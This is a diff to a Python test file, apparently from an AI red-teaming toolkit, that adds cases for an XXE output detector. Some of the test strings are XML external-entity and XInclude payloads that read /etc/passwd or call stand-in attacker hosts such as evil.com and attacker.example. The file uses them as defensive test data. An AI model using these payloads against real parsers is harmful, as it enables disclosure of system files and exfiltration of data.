@@ -17,6 +17,8 @@ from pyrit.score import XXEOutputScorer
         '<!ENTITY % ext SYSTEM "http://evil.com/dtd">',
         '<!DOCTYPE foo [<!ENTITY x "y">]>',
         '<!ENTITY data SYSTEM "https://attacker.com/x">',
+        '<xi:include href="file:///etc/passwd" />',
+        '<xi:include href="https://attacker.example/collect" />',
     ],
 )
 async def test_xxe_detected(text: str, patch_central_database):
@@ -32,6 +34,8 @@ async def test_xxe_detected(text: str, patch_central_database):
         "<!DOCTYPE html>",
         "The &amp; entity reference is standard HTML.",
         "Use XML for your configuration files.",
+        '<xi:include href="relative-notes.xml" />',
+        '<document href="file:///etc/passwd" />',
     ],
 )
 async def test_xxe_not_detected(text: str, patch_central_database):
